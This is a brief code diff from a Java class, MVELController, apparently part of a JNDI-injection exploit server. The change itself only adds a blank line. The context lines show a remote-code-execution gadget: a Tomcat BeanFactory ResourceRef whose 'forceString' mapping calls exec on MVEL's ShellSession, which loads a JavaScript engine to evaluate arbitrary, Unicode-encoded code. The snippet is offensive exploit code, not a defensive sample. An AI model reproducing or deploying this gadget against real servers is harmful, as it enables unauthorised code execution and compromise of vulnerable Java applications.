@@ -21,6 +21,7 @@ public class MVELController extends BasicController {
         ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=exec"));
         ref.add(new StringRefAddr("x", "push Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + MiscUtil.encodeUnicode(code) + "\");"));
+
         return ref;
     }
 }
